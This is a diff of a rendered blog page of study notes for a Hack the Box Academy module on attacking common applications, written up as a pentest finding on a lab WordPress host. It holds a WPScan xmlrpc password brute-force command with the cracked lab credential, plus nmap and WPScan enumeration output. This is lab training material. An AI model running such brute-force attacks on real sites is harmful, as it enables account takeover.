@@ -22,6 +22,40 @@ ul.task-list li input[type="checkbox"] {
   margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
   vertical-align: middle;
 }
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
 </style>
 
 
@@ -161,7 +195,7 @@ ul.task-list li input[type="checkbox"] {
 <header id="title-block-header" class="quarto-title-block default page-columns page-full">
   <div class="quarto-title-banner page-columns page-full">
     <div class="quarto-title column-body">
-      <h1 class="title">Hack the Box</h1>
+      <div class="quarto-title-block"><div><h1 class="title">Hack the Box</h1><button type="button" class="btn code-tools-button" id="quarto-code-tools-source"><i class="bi"></i> Code</button></div></div>
             <p class="subtitle lead">Module: Attacking Common Applications</p>
                                 <div class="quarto-categories">
                 <div class="quarto-category">Learning</div>
@@ -201,20 +235,13 @@ ul.task-list li input[type="checkbox"] {
     <h2 id="toc-title">Table of contents</h2>
    
   <ul>
-  <li><a href="#scope" id="toc-scope" class="nav-link active" data-scroll-target="#scope">Scope</a></li>
-  <li><a href="#discoveryenumeration" id="toc-discoveryenumeration" class="nav-link" data-scroll-target="#discoveryenumeration">Discovery/Enumeration</a></li>
-  <li><a href="#application-discovery" id="toc-application-discovery" class="nav-link" data-scroll-target="#application-discovery">Application Discovery</a>
+  <li><a href="#attack-chain-1-compromising-wordpress" id="toc-attack-chain-1-compromising-wordpress" class="nav-link active" data-scroll-target="#attack-chain-1-compromising-wordpress">Attack Chain 1: Compromising Wordpress</a>
   <ul class="collapse">
-  <li><a href="#blog.inlanefreight.local" id="toc-blog.inlanefreight.local" class="nav-link" data-scroll-target="#blog.inlanefreight.local"><code>blog.inlanefreight.local</code></a></li>
+  <li><a href="#detailed-summary" id="toc-detailed-summary" class="nav-link" data-scroll-target="#detailed-summary">Detailed Summary</a></li>
+  <li><a href="#technical-reproduction-steps" id="toc-technical-reproduction-steps" class="nav-link" data-scroll-target="#technical-reproduction-steps">Technical Reproduction Steps</a></li>
+  <li><a href="#findings" id="toc-findings" class="nav-link" data-scroll-target="#findings">Findings</a></li>
   </ul></li>
-  <li><a href="#exploitation" id="toc-exploitation" class="nav-link" data-scroll-target="#exploitation">Exploitation</a></li>
-  <li><a href="#post-exploitation" id="toc-post-exploitation" class="nav-link" data-scroll-target="#post-exploitation">Post-Exploitation</a></li>
-  <li><a href="#tools" id="toc-tools" class="nav-link" data-scroll-target="#tools">Tools</a>
-  <ul class="collapse">
-  <li><a href="#nmap" id="toc-nmap" class="nav-link" data-scroll-target="#nmap"><code>nmap</code></a></li>
-  <li><a href="#eyewitness" id="toc-eyewitness" class="nav-link" data-scroll-target="#eyewitness">Eyewitness</a></li>
-  <li><a href="#aquatone" id="toc-aquatone" class="nav-link" data-scroll-target="#aquatone">Aquatone</a></li>
-  </ul></li>
+  <li><a href="#appendix-a.-scope" id="toc-appendix-a.-scope" class="nav-link" data-scroll-target="#appendix-a.-scope">Appendix A. Scope</a></li>
   </ul>
 </nav>
     </div>
@@ -224,11 +251,65 @@ ul.task-list li input[type="checkbox"] {
 
 
 
-<section id="scope" class="level2">
-<h2 class="anchored" data-anchor-id="scope">Scope</h2>
-<div class="{{callout-note}}">
-<p>Not all hosts in the scope list are accessible when spawning the target below.</p>
-</div>
+<section id="attack-chain-1-compromising-wordpress" class="level2">
+<h2 class="anchored" data-anchor-id="attack-chain-1-compromising-wordpress">Attack Chain 1: Compromising Wordpress</h2>
+<section id="detailed-summary" class="level3">
+<h3 class="anchored" data-anchor-id="detailed-summary">Detailed Summary</h3>
+<ul>
+<li>Host enumeration and discovery</li>
+<li>Wordpress discovery and enumeration</li>
+</ul>
+</section>
+<section id="technical-reproduction-steps" class="level3">
+<h3 class="anchored" data-anchor-id="technical-reproduction-steps">Technical Reproduction Steps</h3>
+</section>
+<section id="findings" class="level3">
+<h3 class="anchored" data-anchor-id="findings">Findings</h3>
+<section id="weak-password-requirements" class="level4">
+<h4 class="anchored" data-anchor-id="weak-password-requirements">Weak Password Requirements</h4>
+<p><em>The affected host does not require users to have strong passwords, making it easier for threat actors to compromise user accounts.</em></p>
+<p><strong>CWE:</strong> CWE-521 <strong>CVSS 3.1 Score:</strong> 9.4 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L) <strong>Root Cause Analysis:</strong> <strong>Security Impact:</strong> When successfully exploited, weak password requirements can result in a threat actor gaining long-term unauthorised access to the users account. Depending on the permissions associated with the compromised account, impact can vary. <strong>Affected Hosts:</strong> blog.inlanefreight.local <strong>Remediation:</strong></p>
+</section>
+<section id="evidence" class="level4">
+<h4 class="anchored" data-anchor-id="evidence">Evidence</h4>
+<p>The following figure shows WPScan and the <code>rockyou.txt</code> password list against <code>blog.inlanefreight.local</code> to brute-force the password for the user account <code>doug</code>. <code>xmlrpc</code> is used as it is faster than HTTP-based password brute-forcing.</p>
+<pre><code>wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -t 20 -U doug -P ~/Sauce/SecLists/Passwords/rockyou.txt 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://blog.inlanefreight.local/ [10.129.107.187]
+[+] Started: Fri Oct 27 08:51:01 2023
+
+...
+
+[!] Valid Combinations Found:
+ | Username: doug, Password: jessica1
+
+...
+
+[+] Finished: Fri Oct 27 08:51:40 2023
+[+] Requests Done: 799
+[+] Cached Requests: 41
+[+] Data Sent: 393.439 KB
+[+] Data Received: 448.799 KB
+[+] Memory used: 284.395 MB
+[+] Elapsed time: 00:00:38</code></pre>
+</section>
+</section>
+</section>
+<section id="appendix-a.-scope" class="level2">
+<h2 class="anchored" data-anchor-id="appendix-a.-scope">Appendix A. Scope</h2>
 <ul>
 <li>app.inlanefreight.local</li>
 <li>dev.inlanefreight.local</li>
@@ -249,164 +330,10 @@ ul.task-list li input[type="checkbox"] {
 <li>inlanefreight.local</li>
 <li>10.129.201.50</li>
 </ul>
-</section>
-<section id="discoveryenumeration" class="level2">
-<h2 class="anchored" data-anchor-id="discoveryenumeration">Discovery/Enumeration</h2>
-</section>
-<section id="application-discovery" class="level2">
-<h2 class="anchored" data-anchor-id="application-discovery">Application Discovery</h2>
-<section id="blog.inlanefreight.local" class="level3">
-<h3 class="anchored" data-anchor-id="blog.inlanefreight.local"><code>blog.inlanefreight.local</code></h3>
-<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-24 20:35 AEDT
-Nmap scan report for blog.inlanefreight.local (10.129.42.195)
-Host is up (1.5s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds</code></pre>
-<pre><code>pscan --url blog.inlanefreight.local
-_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.22
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-[+] URL: http://blog.inlanefreight.local/ [10.129.239.31]
-[+] Started: Tue Oct 24 10:49:56 2023
-
-Interesting Finding(s):
-
-[+] Headers
- | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
-
-[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-
-[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
-
-[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
- | Found By: Rss Generator (Passive Detection)
- |  - http://blog.inlanefreight.local/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;
- |  - http://blog.inlanefreight.local/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;
-
-[+] WordPress theme in use: transport-gravity
- | Location: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/
- | Latest Version: 1.0.1 (up to date)
- | Last Updated: 2020-08-02T00:00:00.000Z
- | Readme: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt
- | [!] Directory listing is enabled
- | Style URL: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css
- | Style Name: Transport Gravity
- | Style URI: https://keonthemes.com/downloads/transport-gravity/
- | Description: Transport Gravity is an enhanced child theme of Business Gravity. Transport Gravity is made for tran...
- | Author: Keon Themes
- | Author URI: https://keonthemes.com/
- |
- | Found By: Css Style In Homepage (Passive Detection)
- | Confirmed By: Urls In Homepage (Passive Detection)
- |
- | Version: 1.0.1 (80% confidence)
- | Found By: Style (Passive Detection)
- |  - http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css, Match: 'Version: 1.0.1'
-
-[+] Enumerating All Plugins (via Passive Methods)
-[+] Checking Plugin Versions (via Passive and Aggressive Methods)
-
-[i] Plugin(s) Identified:
-
-[+] contact-form-7
- | Location: http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/
- | Last Updated: 2023-09-28T08:58:00.000Z
- | [!] The version is out of date, the latest version is 5.8.1
- |
- | Found By: Urls In Homepage (Passive Detection)
- |
- | Version: 5.4.2 (90% confidence)
- | Found By: Query Parameter (Passive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2
- | Confirmed By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/readme.txt
-
-[+] mail-masta
- | Location: http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
- | Latest Version: 1.0 (up to date)
- | Last Updated: 2014-09-19T07:52:00.000Z
- |
- | Found By: Urls In Homepage (Passive Detection)
- |
- | Version: 1.0 (80% confidence)
- | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
-
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
- Checking Config Backups - Time: 00:00:01 &lt;=&gt; (137 / 137) 100.00% Time: 00:00:01
-
-[i] No Config Backups Found.
-
-[!] No WPScan API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Tue Oct 24 10:50:01 2023
-[+] Requests Done: 174
-[+] Cached Requests: 6
-[+] Data Sent: 47.007 KB
-[+] Data Received: 539.386 KB
-[+] Memory used: 258.449 MB
-[+] Elapsed time: 00:00:04</code></pre>
-</section>
-</section>
-<section id="exploitation" class="level2">
-<h2 class="anchored" data-anchor-id="exploitation">Exploitation</h2>
-</section>
-<section id="post-exploitation" class="level2">
-<h2 class="anchored" data-anchor-id="post-exploitation">Post-Exploitation</h2>
-</section>
-<section id="tools" class="level2">
-<h2 class="anchored" data-anchor-id="tools">Tools</h2>
-<section id="nmap" class="level3">
-<h3 class="anchored" data-anchor-id="nmap"><code>nmap</code></h3>
-<pre class="shell-session"><code>nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list</code></pre>
-</section>
-<section id="eyewitness" class="level3">
-<h3 class="anchored" data-anchor-id="eyewitness">Eyewitness</h3>
-</section>
-<section id="aquatone" class="level3">
-<h3 class="anchored" data-anchor-id="aquatone">Aquatone</h3>
 
 
-</section>
+<!-- -->
+
 </section>
 
 <a onclick="window.scrollTo(0, 0); return false;" role="button" id="quarto-back-to-top"><i class="bi bi-arrow-up"></i> Back to top</a></main> <!-- /main -->
@@ -489,6 +416,57 @@ window.document.addEventListener("DOMContentLoaded", function (event) {
     // clear code selection
     e.clearSelection();
   });
+  const viewSource = window.document.getElementById('quarto-view-source') ||
+                     window.document.getElementById('quarto-code-tools-source');
+  if (viewSource) {
+    const sourceUrl = viewSource.getAttribute("data-quarto-source-url");
+    viewSource.addEventListener("click", function(e) {
+      if (sourceUrl) {
+        // rstudio viewer pane
+        if (/\bcapabilities=\b/.test(window.location)) {
+          window.open(sourceUrl);
+        } else {
+          window.location.href = sourceUrl;
+        }
+      } else {
+        const modal = new bootstrap.Modal(document.getElementById('quarto-embedded-source-code-modal'));
+        modal.show();
+      }
+      return false;
+    });
+  }
+  function toggleCodeHandler(show) {
+    return function(e) {
+      const detailsSrc = window.document.querySelectorAll(".cell > details > .sourceCode");
+      for (let i=0; i<detailsSrc.length; i++) {
+        const details = detailsSrc[i].parentElement;
+        if (show) {
+          details.open = true;
+        } else {
+          details.removeAttribute("open");
+        }
+      }
+      const cellCodeDivs = window.document.querySelectorAll(".cell > .sourceCode");
+      const fromCls = show ? "hidden" : "unhidden";
+      const toCls = show ? "unhidden" : "hidden";
+      for (let i=0; i<cellCodeDivs.length; i++) {
+        const codeDiv = cellCodeDivs[i];
+        if (codeDiv.classList.contains(fromCls)) {
+          codeDiv.classList.remove(fromCls);
+          codeDiv.classList.add(toCls);
+        } 
+      }
+      return false;
+    }
+  }
+  const hideAllCode = window.document.getElementById("quarto-hide-all-code");
+  if (hideAllCode) {
+    hideAllCode.addEventListener("click", toggleCodeHandler(false));
+  }
+  const showAllCode = window.document.getElementById("quarto-show-all-code");
+  if (showAllCode) {
+    showAllCode.addEventListener("click", toggleCodeHandler(true));
+  }
   function tippyHover(el, contentFn) {
     const config = {
       allowHTML: true,
@@ -656,7 +634,101 @@ window.document.addEventListener("DOMContentLoaded", function (event) {
       }
     }
 });
-</script>
+</script><div class="modal fade" id="quarto-embedded-source-code-modal" tabindex="-1" aria-labelledby="quarto-embedded-source-code-modal-label" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="quarto-embedded-source-code-modal-label">Source Code</h5><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div class="">
+<div class="sourceCode" id="cb2" data-shortcodes="false"><pre class="sourceCode numberSource markdown number-lines code-with-copy"><code class="sourceCode markdown"><span id="cb2-1"><a href="#cb2-1"></a><span class="co">---</span></span>
+<span id="cb2-2"><a href="#cb2-2"></a><span class="an">title:</span><span class="co"> "Hack the Box"</span></span>
+<span id="cb2-3"><a href="#cb2-3"></a><span class="an">subtitle:</span><span class="co"> "Module: Attacking Common Applications"</span></span>
+<span id="cb2-4"><a href="#cb2-4"></a><span class="an">author:</span><span class="co"> "errbufferoverfl"</span></span>
+<span id="cb2-5"><a href="#cb2-5"></a><span class="an">date:</span><span class="co"> 2023-10-21T19:23:04+11:00</span></span>
+<span id="cb2-6"><a href="#cb2-6"></a><span class="an">categories:</span></span>
+<span id="cb2-7"><a href="#cb2-7"></a><span class="co">- Learning</span></span>
+<span id="cb2-8"><a href="#cb2-8"></a><span class="co">- Hack the Box</span></span>
+<span id="cb2-9"><a href="#cb2-9"></a><span class="co">- Hack the Box Academy</span></span>
+<span id="cb2-10"><a href="#cb2-10"></a><span class="co">- Offensive</span></span>
+<span id="cb2-11"><a href="#cb2-11"></a><span class="co">---</span></span>
+<span id="cb2-12"><a href="#cb2-12"></a></span>
+<span id="cb2-13"><a href="#cb2-13"></a><span class="fu">## Attack Chain 1: Compromising Wordpress</span></span>
+<span id="cb2-14"><a href="#cb2-14"></a></span>
+<span id="cb2-15"><a href="#cb2-15"></a><span class="fu">### Detailed Summary</span></span>
+<span id="cb2-16"><a href="#cb2-16"></a></span>
+<span id="cb2-17"><a href="#cb2-17"></a><span class="ss">- </span>Host enumeration and discovery</span>
+<span id="cb2-18"><a href="#cb2-18"></a><span class="ss">- </span>Wordpress discovery and enumeration</span>
+<span id="cb2-19"><a href="#cb2-19"></a></span>
+<span id="cb2-20"><a href="#cb2-20"></a><span class="fu">### Technical Reproduction Steps</span></span>
+<span id="cb2-21"><a href="#cb2-21"></a></span>
+<span id="cb2-22"><a href="#cb2-22"></a><span class="fu">### Findings</span></span>
+<span id="cb2-23"><a href="#cb2-23"></a></span>
+<span id="cb2-24"><a href="#cb2-24"></a><span class="fu">#### Weak Password Requirements</span></span>
+<span id="cb2-25"><a href="#cb2-25"></a></span>
+<span id="cb2-26"><a href="#cb2-26"></a>*The affected host does not require users to have strong passwords, making it easier for threat actors to compromise user accounts.*</span>
+<span id="cb2-27"><a href="#cb2-27"></a></span>
+<span id="cb2-28"><a href="#cb2-28"></a>**CWE:** CWE-521</span>
+<span id="cb2-29"><a href="#cb2-29"></a>**CVSS 3.1 Score:** 9.4 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)</span>
+<span id="cb2-30"><a href="#cb2-30"></a>**Root Cause Analysis:** </span>
+<span id="cb2-31"><a href="#cb2-31"></a>**Security Impact:** When successfully exploited, weak password requirements can result in a threat actor gaining long-term unauthorised access to the users account. Depending on the permissions associated with the compromised account, impact can vary.</span>
+<span id="cb2-32"><a href="#cb2-32"></a>**Affected Hosts:** blog.inlanefreight.local</span>
+<span id="cb2-33"><a href="#cb2-33"></a>**Remediation:**</span>
+<span id="cb2-34"><a href="#cb2-34"></a></span>
+<span id="cb2-35"><a href="#cb2-35"></a><span class="fu">#### Evidence</span></span>
+<span id="cb2-36"><a href="#cb2-36"></a></span>
+<span id="cb2-37"><a href="#cb2-37"></a>The following figure shows WPScan and the <span class="in">`rockyou.txt`</span> password list against <span class="in">`blog.inlanefreight.local`</span> to brute-force the password for the user account <span class="in">`doug`</span>. <span class="in">`xmlrpc`</span> is used as it is faster than HTTP-based password brute-forcing.</span>
+<span id="cb2-38"><a href="#cb2-38"></a></span>
+<span id="cb2-39"><a href="#cb2-39"></a><span class="in">```</span></span>
+<span id="cb2-40"><a href="#cb2-40"></a><span class="in">wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -t 20 -U doug -P ~/Sauce/SecLists/Passwords/rockyou.txt </span></span>
+<span id="cb2-41"><a href="#cb2-41"></a><span class="in">_______________________________________________________________</span></span>
+<span id="cb2-42"><a href="#cb2-42"></a><span class="in">         __          _______   _____</span></span>
+<span id="cb2-43"><a href="#cb2-43"></a><span class="in">         \ \        / /  __ \ / ____|</span></span>
+<span id="cb2-44"><a href="#cb2-44"></a><span class="in">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span></span>
+<span id="cb2-45"><a href="#cb2-45"></a><span class="in">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span></span>
+<span id="cb2-46"><a href="#cb2-46"></a><span class="in">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span>
+<span id="cb2-47"><a href="#cb2-47"></a><span class="in">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span>
+<span id="cb2-48"><a href="#cb2-48"></a></span>
+<span id="cb2-49"><a href="#cb2-49"></a><span class="in">         WordPress Security Scanner by the WPScan Team</span></span>
+<span id="cb2-50"><a href="#cb2-50"></a><span class="in">                         Version 3.8.25</span></span>
+<span id="cb2-51"><a href="#cb2-51"></a><span class="in">       Sponsored by Automattic - https://automattic.com/</span></span>
+<span id="cb2-52"><a href="#cb2-52"></a><span class="in">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span>
+<span id="cb2-53"><a href="#cb2-53"></a><span class="in">_______________________________________________________________</span></span>
+<span id="cb2-54"><a href="#cb2-54"></a></span>
+<span id="cb2-55"><a href="#cb2-55"></a><span class="in">[+] URL: http://blog.inlanefreight.local/ [10.129.107.187]</span></span>
+<span id="cb2-56"><a href="#cb2-56"></a><span class="in">[+] Started: Fri Oct 27 08:51:01 2023</span></span>
+<span id="cb2-57"><a href="#cb2-57"></a></span>
+<span id="cb2-58"><a href="#cb2-58"></a><span class="in">...</span></span>
+<span id="cb2-59"><a href="#cb2-59"></a></span>
+<span id="cb2-60"><a href="#cb2-60"></a><span class="in">[!] Valid Combinations Found:</span></span>
+<span id="cb2-61"><a href="#cb2-61"></a><span class="in"> | Username: doug, Password: jessica1</span></span>
+<span id="cb2-62"><a href="#cb2-62"></a></span>
+<span id="cb2-63"><a href="#cb2-63"></a><span class="in">...</span></span>
+<span id="cb2-64"><a href="#cb2-64"></a></span>
+<span id="cb2-65"><a href="#cb2-65"></a><span class="in">[+] Finished: Fri Oct 27 08:51:40 2023</span></span>
+<span id="cb2-66"><a href="#cb2-66"></a><span class="in">[+] Requests Done: 799</span></span>
+<span id="cb2-67"><a href="#cb2-67"></a><span class="in">[+] Cached Requests: 41</span></span>
+<span id="cb2-68"><a href="#cb2-68"></a><span class="in">[+] Data Sent: 393.439 KB</span></span>
+<span id="cb2-69"><a href="#cb2-69"></a><span class="in">[+] Data Received: 448.799 KB</span></span>
+<span id="cb2-70"><a href="#cb2-70"></a><span class="in">[+] Memory used: 284.395 MB</span></span>
+<span id="cb2-71"><a href="#cb2-71"></a><span class="in">[+] Elapsed time: 00:00:38</span></span>
+<span id="cb2-72"><a href="#cb2-72"></a><span class="in">```</span></span>
+<span id="cb2-73"><a href="#cb2-73"></a></span>
+<span id="cb2-74"><a href="#cb2-74"></a><span class="fu">## Appendix A. Scope</span></span>
+<span id="cb2-75"><a href="#cb2-75"></a></span>
+<span id="cb2-76"><a href="#cb2-76"></a><span class="ss">-   </span>app.inlanefreight.local</span>
+<span id="cb2-77"><a href="#cb2-77"></a><span class="ss">-   </span>dev.inlanefreight.local</span>
+<span id="cb2-78"><a href="#cb2-78"></a><span class="ss">-   </span>drupal-dev.inlanefreight.local</span>
+<span id="cb2-79"><a href="#cb2-79"></a><span class="ss">-   </span>drupal-qa.inlanefreight.local</span>
+<span id="cb2-80"><a href="#cb2-80"></a><span class="ss">-   </span>drupal-acc.inlanefreight.local</span>
+<span id="cb2-81"><a href="#cb2-81"></a><span class="ss">-   </span>drupal.inlanefreight.local</span>
+<span id="cb2-82"><a href="#cb2-82"></a><span class="ss">-   </span>blog-dev.inlanefreight.local</span>
+<span id="cb2-83"><a href="#cb2-83"></a><span class="ss">-   </span>blog.inlanefreight.local</span>
+<span id="cb2-84"><a href="#cb2-84"></a><span class="ss">-   </span>app-dev.inlanefreight.local</span>
+<span id="cb2-85"><a href="#cb2-85"></a><span class="ss">-   </span>jenkins-dev.inlanefreight.local</span>
+<span id="cb2-86"><a href="#cb2-86"></a><span class="ss">-   </span>jenkins.inlanefreight.local</span>
+<span id="cb2-87"><a href="#cb2-87"></a><span class="ss">-   </span>web01.inlanefreight.local</span>
+<span id="cb2-88"><a href="#cb2-88"></a><span class="ss">-   </span>gitlab-dev.inlanefreight.local</span>
+<span id="cb2-89"><a href="#cb2-89"></a><span class="ss">-   </span>gitlab.inlanefreight.local</span>
+<span id="cb2-90"><a href="#cb2-90"></a><span class="ss">-   </span>support-dev.inlanefreight.local</span>
+<span id="cb2-91"><a href="#cb2-91"></a><span class="ss">-   </span>support.inlanefreight.local</span>
+<span id="cb2-92"><a href="#cb2-92"></a><span class="ss">-   </span>inlanefreight.local</span>
+<span id="cb2-93"><a href="#cb2-93"></a><span class="ss">-   </span>10.129.201.50</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</div></div></div></div></div>
 </div> <!-- /content -->
 <footer class="footer">
   <div class="nav-footer">
